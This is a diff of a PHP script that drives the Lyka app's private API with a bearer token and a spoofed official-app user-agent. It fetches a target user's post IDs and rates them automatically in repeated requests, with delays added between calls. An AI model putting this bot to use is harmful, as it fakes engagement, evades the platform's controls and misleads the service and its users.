-$headersm = array("user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)", "authorization: Bearer $bearer",);
-curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
-$respm = curl_exec($curlm);
-curl_close($curlm);
-//var_dump($respm);
-$jsonm = json_decode($respm, true);
-$buid = $jsonm["data"]["0"]["id"];
-$bvvuser = $jsonm["data"]["0"]["userName"];
-//cho $bvvuser;
-//echo $buid;
-/*if($bvvuser == $user022){
-$urlg = "https://profiles.mylykaapps.com/api/v3/profiles/GetUser";
-//$bearer3 = $jsonn2->data->token->accessToken;
-$curlg = curl_init($urlg);
-curl_setopt($curlg, CURLOPT_URL, $urlg);
-curl_setopt($curlg, CURLOPT_POST, true);
-curl_setopt($curlg, CURLOPT_RETURNTRANSFER, true);
-
-$headersg = array(
-   "authorization: Bearer $bearer",
-   "Content-Type: application/json",
-);
-curl_setopt($curlg, CURLOPT_HTTPHEADER, $headersg);
-
-$datax = <<<DATA
-{
-  "type": "username",
-  "username": "$user022"
-}
-DATA;
-
-curl_setopt($curlg, CURLOPT_POSTFIELDS, $datax);
-
-$respg = curl_exec($curlg);
-curl_close($curlg);
-//var_dump($respg);
-$jsong = json_decode($respg);
-$xuid = $jsong->data->id;
-//echo $xuid;
-$uname = $jsong->data->userName;
-$green="[1;32m";
-echo "$green$uname is RATED
-";
-//$gmsg = $jsong->data->message;
-}
-*/
-if ($user022 == $bvvuser) {
-    $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$buid&category=ALL";
-    $curld = curl_init($urld);
-    curl_setopt($curld, CURLOPT_URL, $urld);
-    curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
-    $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)",);
-    curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
-    $respd = curl_exec($curld);
-    curl_close($curld);
-    $jsond = json_decode($respd, true);
-    //var_dump($respd,true);
-    /*function printValues($arr) {
-    global $count;
-    global $values;
+    $urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user022&os=android&pageIndex=1&pageSize=16";
+    $curlm = curl_init($urlm);
+    curl_setopt($curlm, CURLOPT_URL, $urlm);
+    curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
+    $headersm = array("user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)", "authorization: Bearer $bearer",);
+    curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
+    $respm = curl_exec($curlm);
+    curl_close($curlm);
+    //var_dump($respm);
+    $jsonm = json_decode($respm, true);
+    $buid = $jsonm["data"]["0"]["id"];
+    $bvvuser = $jsonm["data"]["0"]["userName"];
+    //cho $bvvuser;
+    //echo $buid;
+    /*if($bvvuser == $user022){
+    $urlg = "https://profiles.mylykaapps.com/api/v3/profiles/GetUser";
+    //$bearer3 = $jsonn2->data->token->accessToken;
+    $curlg = curl_init($urlg);
+    curl_setopt($curlg, CURLOPT_URL, $urlg);
+    curl_setopt($curlg, CURLOPT_POST, true);
+    curl_setopt($curlg, CURLOPT_RETURNTRANSFER, true);
     
-    // Check input is an array
-    if(!is_array($arr)){
-        die("ERROR: Input is not an array");
+    $headersg = array(
+    "authorization: Bearer $bearer",
+    "Content-Type: application/json",
+    );
+    curl_setopt($curlg, CURLOPT_HTTPHEADER, $headersg);
+    
+    $datax = <<<DATA
+    {
+    "type": "username",
+    "username": "$user022"
     }
+    DATA;
     
+    curl_setopt($curlg, CURLOPT_POSTFIELDS, $datax);
     
-    foreach($arr as $key=>$value){
+    $respg = curl_exec($curlg);
+    curl_close($curlg);
+    //var_dump($respg);
+    $jsong = json_decode($respg);
+    $xuid = $jsong->data->id;
+    //echo $xuid;
+    $uname = $jsong->data->userName;
+    $green="[1;32m";
+    echo "$green$uname is RATED
+    ";
+    //$gmsg = $jsong->data->message;
+    }
+    */
+    if ($user022 == $bvvuser) {
+        $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$buid&category=ALL";
+        $curld = curl_init($urld);
+        curl_setopt($curld, CURLOPT_URL, $urld);
+        curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
+        $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)",);
+        curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
+        $respd = curl_exec($curld);
+        curl_close($curld);
+        $jsond = json_decode($respd, true);
+        //var_dump($respd,true);
+        /*function printValues($arr) {
+        global $count;
+        global $values;
+        
+        // Check input is an array
+        if(!is_array($arr)){
+        die("ERROR: Input is not an array");
+        }
+        
+        
+        foreach($arr as $key=>$value){
         if(is_array($value)){
             printValues($value);
         } else{
             $values[] = $value;
             $count++;
         }
+        }
+        
+        // Return total count and values found in array
+        return array('total' => $count, 'values' => $values);
+        }
+        */
+        $arr = json_decode($respd, true);
+        $op0 = $arr["data"]["0"]["id"];
+        $op1 = $arr["data"]["1"]["id"];
+        $op2 = $arr["data"]["2"]["id"];
+        $op3 = $arr["data"]["3"]["id"];
+        $op4 = $arr["data"]["4"]["id"];
+        $op5 = $arr["data"]["5"]["id"];
+        $op6 = $arr["data"]["6"]["id"];
+        $op7 = $arr["data"]["7"]["id"];
+        $op8 = $arr["data"]["8"]["id"];
+        $op9 = $arr["data"]["9"]["id"];
+        $op10 = $arr["data"]["10"]["id"];
+        //echo $op10;
+        //echo $op9;
+        
     }
-    
-    // Return total count and values found in array
-    return array('total' => $count, 'values' => $values);
-    }
-    */
-    $arr = json_decode($respd, true);
-    $op0 = $arr["data"]["0"]["id"];
-    $op1 = $arr["data"]["1"]["id"];
-    $op2 = $arr["data"]["2"]["id"];
-    $op3 = $arr["data"]["3"]["id"];
-    $op4 = $arr["data"]["4"]["id"];
-    $op5 = $arr["data"]["5"]["id"];
-    $op6 = $arr["data"]["6"]["id"];
-    $op7 = $arr["data"]["7"]["id"];
-    $op8 = $arr["data"]["8"]["id"];
-    $op9 = $arr["data"]["9"]["id"];
-    $op10 = $arr["data"]["10"]["id"];
-    //echo $op10;
-    //echo $op9;
-    
-}
-$stat = $arr["status"];
-//echo $stat;
-if ($stat == 0) {
-    echo "check your inputs
+    $stat = $arr["status"];
+    //echo $stat;
+    if ($stat == 0) {
+        echo "check your inputs
 ";
-} elseif ($stat == 1) $e = "[1;34m";
-echo "$e";
-$url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
-$curl = curl_init($url);
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_POST, true);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-$headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
-curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-$data09 = <<<DATA
+    } elseif ($stat == 1) $e = "[1;34m";
+    echo "$e";
+    sleep(1);
+    $url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
+    $curl = curl_init($url);
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_POST, true);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
+    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+    $data09 = <<<DATA
 {
 	
   "device": {
@@ -867,21 +884,22 @@ $data09 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl, CURLOPT_POSTFIELDS, $data09);
-$resp = curl_exec($curl);
-curl_close($curl);
-//var_dump($resp);
-$json = json_decode($resp);
-echo $json->message;
-echo "
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data09);
+    $resp = curl_exec($curl);
+    curl_close($curl);
+    //var_dump($resp);
+    $json = json_decode($resp);
+    echo $json->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl2 = curl_init($url);
-curl_setopt($curl2, CURLOPT_URL, $url);
-curl_setopt($curl2, CURLOPT_POST, true);
-curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
-$data92 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl2 = curl_init($url);
+    curl_setopt($curl2, CURLOPT_URL, $url);
+    curl_setopt($curl2, CURLOPT_POST, true);
+    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);
+    $data92 = <<<DATA
 {
 	
   "device": {
@@ -899,21 +917,22 @@ $data92 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl2, CURLOPT_POSTFIELDS, $data92);
-$resp2 = curl_exec($curl2);
-curl_close($curl2);
-//var_dump($resp2);
-$json2 = json_decode($resp2);
-echo $json2->message;
-echo "
+    curl_setopt($curl2, CURLOPT_POSTFIELDS, $data92);
+    $resp2 = curl_exec($curl2);
+    curl_close($curl2);
+    //var_dump($resp2);
+    $json2 = json_decode($resp2);
+    echo $json2->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl3 = curl_init($url);
-curl_setopt($curl3, CURLOPT_URL, $url);
-curl_setopt($curl3, CURLOPT_POST, true);
-curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
-$data93 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl3 = curl_init($url);
+    curl_setopt($curl3, CURLOPT_URL, $url);
+    curl_setopt($curl3, CURLOPT_POST, true);
+    curl_setopt($curl3, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl3, CURLOPT_HTTPHEADER, $headers);
+    $data93 = <<<DATA
 {
 	
   "device": {
@@ -931,21 +950,22 @@ $data93 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl3, CURLOPT_POSTFIELDS, $data93);
-$resp3 = curl_exec($curl3);
-curl_close($curl3);
-//var_dump($resp2);
-$json3 = json_decode($resp3);
-echo $json3->message;
-echo "
+    curl_setopt($curl3, CURLOPT_POSTFIELDS, $data93);
+    $resp3 = curl_exec($curl3);
+    curl_close($curl3);
+    //var_dump($resp2);
+    $json3 = json_decode($resp3);
+    echo $json3->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl4 = curl_init($url);
-curl_setopt($curl4, CURLOPT_URL, $url);
-curl_setopt($curl4, CURLOPT_POST, true);
-curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
-$data94 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl4 = curl_init($url);
+    curl_setopt($curl4, CURLOPT_URL, $url);
+    curl_setopt($curl4, CURLOPT_POST, true);
+    curl_setopt($curl4, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl4, CURLOPT_HTTPHEADER, $headers);
+    $data94 = <<<DATA
 {
 	
   "device": {
@@ -963,21 +983,22 @@ $data94 = <<<DATA
    "userid": $buid 
 }
 DATA;
-curl_setopt($curl4, CURLOPT_POSTFIELDS, $data94);
-$resp4 = curl_exec($curl4);
-curl_close($curl4);
-//var_dump($resp2);
-$json4 = json_decode($resp4);
-echo $json4->message;
-echo "
+    curl_setopt($curl4, CURLOPT_POSTFIELDS, $data94);
+    $resp4 = curl_exec($curl4);
+    curl_close($curl4);
+    //var_dump($resp2);
+    $json4 = json_decode($resp4);
+    echo $json4->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl5 = curl_init($url);
-curl_setopt($curl5, CURLOPT_URL, $url);
-curl_setopt($curl5, CURLOPT_POST, true);
-curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
-$data95 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl5 = curl_init($url);
+    curl_setopt($curl5, CURLOPT_URL, $url);
+    curl_setopt($curl5, CURLOPT_POST, true);
+    curl_setopt($curl5, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl5, CURLOPT_HTTPHEADER, $headers);
+    $data95 = <<<DATA
 {
 	
   "device": {
@@ -995,21 +1016,22 @@ $data95 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl5, CURLOPT_POSTFIELDS, $data95);
-$resp5 = curl_exec($curl5);
-curl_close($curl5);
-//var_dump($resp2);
-$json5 = json_decode($resp5);
-echo $json5->message;
-echo "
+    curl_setopt($curl5, CURLOPT_POSTFIELDS, $data95);
+    $resp5 = curl_exec($curl5);
+    curl_close($curl5);
+    //var_dump($resp2);
+    $json5 = json_decode($resp5);
+    echo $json5->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl6 = curl_init($url);
-curl_setopt($curl6, CURLOPT_URL, $url);
-curl_setopt($curl6, CURLOPT_POST, true);
-curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
-$data96 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl6 = curl_init($url);
+    curl_setopt($curl6, CURLOPT_URL, $url);
+    curl_setopt($curl6, CURLOPT_POST, true);
+    curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
+    $data96 = <<<DATA
 {
 	
   "device": {
@@ -1027,21 +1049,22 @@ $data96 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl6, CURLOPT_POSTFIELDS, $data96);
-$resp6 = curl_exec($curl6);
-curl_close($curl6);
-//var_dump($resp2);
-$json6 = json_decode($resp6);
-echo $json6->message;
-echo "
+    curl_setopt($curl6, CURLOPT_POSTFIELDS, $data96);
+    $resp6 = curl_exec($curl6);
+    curl_close($curl6);
+    //var_dump($resp2);
+    $json6 = json_decode($resp6);
+    echo $json6->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl7 = curl_init($url);
-curl_setopt($curl7, CURLOPT_URL, $url);
-curl_setopt($curl7, CURLOPT_POST, true);
-curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
-$data97 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl7 = curl_init($url);
+    curl_setopt($curl7, CURLOPT_URL, $url);
+    curl_setopt($curl7, CURLOPT_POST, true);
+    curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
+    $data97 = <<<DATA
 {
 	
   "device": {
@@ -1059,21 +1082,22 @@ $data97 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl7, CURLOPT_POSTFIELDS, $data97);
-$resp7 = curl_exec($curl7);
-curl_close($curl7);
-//var_dump($resp2);
-$json7 = json_decode($resp7);
-echo $json7->message;
-echo "
+    curl_setopt($curl7, CURLOPT_POSTFIELDS, $data97);
+    $resp7 = curl_exec($curl7);
+    curl_close($curl7);
+    //var_dump($resp2);
+    $json7 = json_decode($resp7);
+    echo $json7->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl8 = curl_init($url);
-curl_setopt($curl8, CURLOPT_URL, $url);
-curl_setopt($curl8, CURLOPT_POST, true);
-curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
-$data98 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl8 = curl_init($url);
+    curl_setopt($curl8, CURLOPT_URL, $url);
+    curl_setopt($curl8, CURLOPT_POST, true);
+    curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
+    $data98 = <<<DATA
 {
 	
   "device": {
@@ -1091,21 +1115,22 @@ $data98 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl8, CURLOPT_POSTFIELDS, $data98);
-$resp8 = curl_exec($curl8);
-curl_close($curl8);
-//var_dump($resp2);
-$json8 = json_decode($resp8);
-echo $json8->message;
-echo "
+    curl_setopt($curl8, CURLOPT_POSTFIELDS, $data98);
+    $resp8 = curl_exec($curl8);
+    curl_close($curl8);
+    //var_dump($resp2);
+    $json8 = json_decode($resp8);
+    echo $json8->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl9 = curl_init($url);
-curl_setopt($curl9, CURLOPT_URL, $url);
-curl_setopt($curl9, CURLOPT_POST, true);
-curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
-$data99 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl9 = curl_init($url);
+    curl_setopt($curl9, CURLOPT_URL, $url);
+    curl_setopt($curl9, CURLOPT_POST, true);
+    curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
+    $data99 = <<<DATA
 {
 	
   "device": {
@@ -1123,21 +1148,22 @@ $data99 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl9, CURLOPT_POSTFIELDS, $data99);
-$resp9 = curl_exec($curl9);
-curl_close($curl9);
-//var_dump($resp2);
-$json9 = json_decode($resp9);
-echo $json9->message;
-echo "
+    curl_setopt($curl9, CURLOPT_POSTFIELDS, $data99);
+    $resp9 = curl_exec($curl9);
+    curl_close($curl9);
+    //var_dump($resp2);
+    $json9 = json_decode($resp9);
+    echo $json9->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl10 = curl_init($url);
-curl_setopt($curl10, CURLOPT_URL, $url);
-curl_setopt($curl10, CURLOPT_POST, true);
-curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
-$data910 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl10 = curl_init($url);
+    curl_setopt($curl10, CURLOPT_URL, $url);
+    curl_setopt($curl10, CURLOPT_POST, true);
+    curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
+    $data910 = <<<DATA
 {
 	
   "device": {
@@ -1155,21 +1181,22 @@ $data910 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl10, CURLOPT_POSTFIELDS, $data910);
-$resp10 = curl_exec($curl10);
-curl_close($curl10);
-//var_dump($resp2);
-$json10 = json_decode($resp10);
-echo $json10->message;
-echo "
+    curl_setopt($curl10, CURLOPT_POSTFIELDS, $data910);
+    $resp10 = curl_exec($curl10);
+    curl_close($curl10);
+    //var_dump($resp2);
+    $json10 = json_decode($resp10);
+    echo $json10->message;
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$curl11 = curl_init($url);
-curl_setopt($curl11, CURLOPT_URL, $url);
-curl_setopt($curl11, CURLOPT_POST, true);
-curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
-$data911 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    sleep(1);
+    $curl11 = curl_init($url);
+    curl_setopt($curl11, CURLOPT_URL, $url);
+    curl_setopt($curl11, CURLOPT_POST, true);
+    curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
+    $data911 = <<<DATA
 {
 	
   "device": {
@@ -1187,148 +1214,149 @@ $data911 = <<<DATA
    "userid": $buid
 }
 DATA;
-curl_setopt($curl11, CURLOPT_POSTFIELDS, $data911);
-$resp11 = curl_exec($curl11);
-curl_close($curl11);
-//var_dump($resp2);
-$json11 = json_decode($resp11);
-echo $json11->message;
-$yellow = "[0;32m";
-echo "$yellow
+    curl_setopt($curl11, CURLOPT_POSTFIELDS, $data911);
+    $resp11 = curl_exec($curl11);
+    curl_close($curl11);
+    //var_dump($resp2);
+    $json11 = json_decode($resp11);
+    echo $json11->message;
+    $yellow = "[0;32m";
+    echo "$yellow
 ";
-echo "=====================================================";
-$l = "[1;34m";
-echo "$l";
-//  $';
-//$pass122 = readline('Enter main pasword: ');
-//$pass;
-//pass122 = 'a122';
-//$user122 = '
-// For output
-$ow = "[1;33m";
-echo "$ow";
-echo "
+    echo "=====================================================";
+    $l = "[1;34m";
+    echo "$l";
+    //  $';
+    //$pass122 = readline('Enter main pasword: ');
+    //$pass;
+    //pass122 = 'a122';
+    //$user122 = '
+    // For output
+    $ow = "[1;33m";
+    echo "$ow";
+    echo "
 $vuser is RATING $user122
 ";
-$urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user122&os=android&pageIndex=1&pageSize=16";
-$curlm = curl_init($urlm);
-curl_setopt($curlm, CURLOPT_URL, $urlm);
-curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
-$headersm = array("user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)", "authorization: Bearer $bearer",);
-curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
-$respm = curl_exec($curlm);
-curl_close($curlm);
-//var_dump($respm);
-$jsonm = json_decode($respm, true);
-$fuid = $jsonm["data"]["0"]["id"];
-$fvvuser = $jsonm["data"]["0"]["userName"];
-//cho $fvvuser;
-//echo $fuid;
-/*if($fvvuser == $user122){
-$urlg = "https://profiles.mylykaapps.com/api/v3/profiles/GetUser";
-//$bearer3 = $jsonn2->data->token->accessToken;
-$curlg = curl_init($urlg);
-curl_setopt($curlg, CURLOPT_URL, $urlg);
-curl_setopt($curlg, CURLOPT_POST, true);
-curl_setopt($curlg, CURLOPT_RETURNTRANSFER, true);
-
-$headersg = array(
-   "authorization: Bearer $bearer",
-   "Content-Type: application/json",
-);
-curl_setopt($curlg, CURLOPT_HTTPHEADER, $headersg);
-
-$datab = <<<DATA
-{
-  "type": "username",
-  "username": "$user122"
-}
-DATA;
-
-curl_setopt($curlg, CURLOPT_POSTFIELDS, $datab);
-
-//for debug only!
-//curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-//curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-
-$respg = curl_exec($curlg);
-curl_close($curlg);
-//var_dump($respg);
-$jsong = json_decode($respg);
-$zuid = $jsong->data->id;
-//echo $zuid;
-$uname = $jsong->data->userName;
-$green="[1;32m";
-echo "$green$uname is RATED
-";
-//$gmsg = $jsong->data->message;
-}
-*/
-if ($user122 == $fvvuser) {
-    $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$fuid&category=ALL";
-    $curld = curl_init($urld);
-    curl_setopt($curld, CURLOPT_URL, $urld);
-    curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
-    $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)",);
-    curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
-    $respd = curl_exec($curld);
-    curl_close($curld);
-    $jsond = json_decode($respd, true);
-    //var_dump($respd,true);
-    /*function printValues($arr) {
-    global $count;
-    global $values;
+    $urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user122&os=android&pageIndex=1&pageSize=16";
+    $curlm = curl_init($urlm);
+    curl_setopt($curlm, CURLOPT_URL, $urlm);
+    curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
+    $headersm = array("user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)", "authorization: Bearer $bearer",);
+    curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
+    $respm = curl_exec($curlm);
+    curl_close($curlm);
+    //var_dump($respm);
+    $jsonm = json_decode($respm, true);
+    $fuid = $jsonm["data"]["0"]["id"];
+    $fvvuser = $jsonm["data"]["0"]["userName"];
+    //cho $fvvuser;
+    //echo $fuid;
+    /*if($fvvuser == $user122){
+    $urlg = "https://profiles.mylykaapps.com/api/v3/profiles/GetUser";
+    //$bearer3 = $jsonn2->data->token->accessToken;
+    $curlg = curl_init($urlg);
+    curl_setopt($curlg, CURLOPT_URL, $urlg);
+    curl_setopt($curlg, CURLOPT_POST, true);
+    curl_setopt($curlg, CURLOPT_RETURNTRANSFER, true);
     
-    // Check input is an array
-    if(!is_array($arr)){
-        die("ERROR: Input is not an array");
+    $headersg = array(
+    "authorization: Bearer $bearer",
+    "Content-Type: application/json",
+    );
+    curl_setopt($curlg, CURLOPT_HTTPHEADER, $headersg);
+    
+    $datab = <<<DATA
+    {
+    "type": "username",
+    "username": "$user122"
     }
+    DATA;
     
+    curl_setopt($curlg, CURLOPT_POSTFIELDS, $datab);
     
-    foreach($arr as $key=>$value){
+    //for debug only!
+    //curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+    //curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    
+    $respg = curl_exec($curlg);
+    curl_close($curlg);
+    //var_dump($respg);
+    $jsong = json_decode($respg);
+    $zuid = $jsong->data->id;
+    //echo $zuid;
+    $uname = $jsong->data->userName;
+    $green="[1;32m";
+    echo "$green$uname is RATED
+    ";
+    //$gmsg = $jsong->data->message;
+    }
+    */
+    if ($user122 == $fvvuser) {
+        $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$fuid&category=ALL";
+        $curld = curl_init($urld);
+        curl_setopt($curld, CURLOPT_URL, $urld);
+        curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
+        $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)",);
+        curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
+        $respd = curl_exec($curld);
+        curl_close($curld);
+        $jsond = json_decode($respd, true);
+        //var_dump($respd,true);
+        /*function printValues($arr) {
+        global $count;
+        global $values;
+        
+        // Check input is an array
+        if(!is_array($arr)){
+        die("ERROR: Input is not an array");
+        }
+        
+        
+        foreach($arr as $key=>$value){
         if(is_array($value)){
             printValues($value);
         } else{
             $values[] = $value;
             $count++;
         }
+        }
+        
+        // Return total count and values found in array
+        return array('total' => $count, 'values' => $values);
+        }
+        */
+        $arr = json_decode($respd, true);
+        $lp0 = $arr["data"]["0"]["id"];
+        $lp1 = $arr["data"]["1"]["id"];
+        $lp2 = $arr["data"]["2"]["id"];
+        $lp3 = $arr["data"]["3"]["id"];
+        $lp4 = $arr["data"]["4"]["id"];
+        $lp5 = $arr["data"]["5"]["id"];
+        $lp6 = $arr["data"]["6"]["id"];
+        $lp7 = $arr["data"]["7"]["id"];
+        $lp8 = $arr["data"]["8"]["id"];
+        $lp9 = $arr["data"]["9"]["id"];
+        $lp10 = $arr["data"]["10"]["id"];
+        //echo $lp10;
+        //echo $lp9;
+        
     }
-    
-    // Return total count and values found in array
-    return array('total' => $count, 'values' => $values);
-    }
-    */
-    $arr = json_decode($respd, true);
-    $lp0 = $arr["data"]["0"]["id"];
-    $lp1 = $arr["data"]["1"]["id"];
-    $lp2 = $arr["data"]["2"]["id"];
-    $lp3 = $arr["data"]["3"]["id"];
-    $lp4 = $arr["data"]["4"]["id"];
-    $lp5 = $arr["data"]["5"]["id"];
-    $lp6 = $arr["data"]["6"]["id"];
-    $lp7 = $arr["data"]["7"]["id"];
-    $lp8 = $arr["data"]["8"]["id"];
-    $lp9 = $arr["data"]["9"]["id"];
-    $lp10 = $arr["data"]["10"]["id"];
-    //echo $lp10;
-    //echo $lp9;
-    
-}
-$stat = $arr["status"];
-//echo $stat;
-if ($stat == 0) {
-    echo "check your inputs
+    $stat = $arr["status"];
+    //echo $stat;
+    if ($stat == 0) {
+        echo "check your inputs
 ";
-} elseif ($stat == 1) $e = "[1;34m";
-echo "$e";
-$url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
-$curl = curl_init($url);
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_POST, true);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-$headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
-curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-$data0 = <<<DATA
